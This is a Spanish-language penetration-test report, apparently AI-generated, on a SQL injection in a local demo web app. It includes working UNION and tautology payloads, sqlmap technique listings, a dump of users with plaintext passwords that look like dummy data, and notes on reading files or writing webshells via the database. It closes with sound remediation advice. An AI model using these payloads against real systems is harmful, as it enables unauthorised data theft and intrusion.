# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-25T11:41:59Z  
**Modelo:** sonnet4.6  
**Tipo de análisis:** SQL Injection  

---

## Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` del endpoint principal de la aplicación web. La explotación permitió la extracción completa de la base de datos `sqli_demo`, incluyendo credenciales en texto plano de 8 usuarios.

---

## Información del Servidor

| Campo | Valor |
|-------|-------|
| URL objetivo | http://web.dev.local:8083 |
| Servidor web | Apache 2.4.65 (Debian) |
| Tecnología | PHP 8.1.33 |
| Base de datos | MariaDB 10.11.14 (fork de MySQL 5) |
| Usuario BD | root@172.18.0.3 |
| Base de datos activa | sqli_demo |
| OS del servidor | Linux Debian |

---

## Vulnerabilidad Detectada

### SQL Injection en parámetro `id` (GET)

**Severidad:** 🔴 CRÍTICA (CVSS 9.8)  
**Tipo:** SQL Injection - Error-based, Boolean-based blind, Time-based blind, UNION query  
**Parámetro vulnerable:** `id` (método GET)  
**Endpoint:** `http://web.dev.local:8083/?id=[PAYLOAD]&Submit=Submit`  

#### Descripción

La aplicación construye una consulta SQL sin sanitizar el parámetro `id`, lo que permite inyectar código SQL arbitrario. La aplicación muestra resultados directamente en la respuesta HTTP, lo que facilita la explotación mediante técnicas UNION y error-based.

#### Prueba manual de concepto

**Payload básico - Volcado de todos los usuarios:**
```
GET /?id=1' OR '1'='1&Submit=Submit
```
Resultado: Se obtuvieron todos los registros de la tabla `users`.

**Payload UNION - Extracción de información del sistema:**
```
GET /?id=-1' UNION SELECT NULL,CONCAT(user(),0x7c,database(),0x7c,version())-- -&Submit=Submit
```
Resultado: `root@172.18.0.3|sqli_demo|10.11.14-MariaDB-ubu2204`

---

## Técnicas de Inyección Identificadas (sqlmap)

| Tipo | Descripción |
|------|-------------|
| Boolean-based blind | `AND boolean-based blind - WHERE or HAVING clause (subquery - comment)` |
| Error-based | `MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)` |
| Time-based blind | `MySQL >= 5.0.12 AND time-based blind (query SLEEP)` |
| UNION query | `Generic UNION query (NULL) - 2 columns` |

---

## Datos Extraídos

### Bases de datos enumeradas

- `information_schema`
- `mysql`
- `performance_schema`
- **`sqli_demo`** ← base de datos de la aplicación
- `sys`

### Tabla `sqli_demo.users` - Volcado completo

| user_id | username | first_name | last_name | email | password |
|---------|----------|------------|-----------|-------|----------|
| 1 | admin | John | Doe | admin@example.com | password123 |
| 2 | jsmith | Jane | Smith | jane@example.com | secret456 |
| 3 | bjohnson | Bob | Johnson | bob@example.com | mypass789 |
| 4 | awilliams | Alice | Williams | alice@example.com | qwerty123 |
| 5 | cbrown | Charlie | Brown | charlie@example.com | password |
| 6 | ddavis | Diana | Davis | diana@example.com | secure123 |
| 7 | emiller | Eve | Miller | eve@example.com | hackme |
| 8 | fwilson | Frank | Wilson | frank@example.com | admin123 |

⚠️ **Las contraseñas se almacenan en texto plano**, lo cual supone una vulnerabilidad adicional grave.

---

## Análisis de Causa Raíz

La vulnerabilidad es causada por la construcción dinámica de consultas SQL concatenando directamente la entrada del usuario sin usar **prepared statements** ni escapado adecuado. Ejemplo probable del código vulnerable:

```php
// CÓDIGO VULNERABLE (ejemplo)
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

---

## Impacto

- **Confidencialidad:** ALTO — Extracción completa de todos los datos de usuarios, incluyendo contraseñas en texto plano.
- **Integridad:** ALTO — Posibilidad de modificar, insertar o eliminar datos en la base de datos.
- **Disponibilidad:** MEDIO — Posibilidad de eliminar datos o realizar ataques DoS mediante consultas pesadas.
- **Acceso al sistema:** ALTO — El usuario de BD es `root`, lo que podría permitir leer archivos del sistema con `LOAD_FILE()` o escribir webshells con `INTO OUTFILE`.

---

## Recomendaciones

1. **Usar Prepared Statements / Consultas parametrizadas:**
   ```php
   // CÓDIGO SEGURO
   $stmt = $conn->prepare("SELECT * FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar entradas:** Verificar que el parámetro `id` sea estrictamente numérico antes de usarlo.

3. **Principio de mínimo privilegio:** El usuario de base de datos de la aplicación no debería ser `root`. Crear un usuario con permisos limitados solo a las tablas necesarias.

4. **Almacenar contraseñas con hashing seguro:** Usar `bcrypt`, `argon2` o `scrypt` en lugar de texto plano.

5. **Desactivar la visualización de errores SQL** en producción para evitar revelar información sensible.

6. **Implementar un WAF** (Web Application Firewall) como capa de defensa adicional.

7. **Auditorías de código regulares** y pruebas de penetración periódicas.

---

## Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad crítica de SQL Injection que permite a un atacante no autenticado extraer toda la información de la base de datos, incluyendo credenciales de todos los usuarios. La explotación es trivial y no requiere autenticación previa. Se recomienda corrección inmediata.

---
*Informe generado automáticamente mediante análisis de seguridad con sqlmap y técnicas manuales de pentesting.*
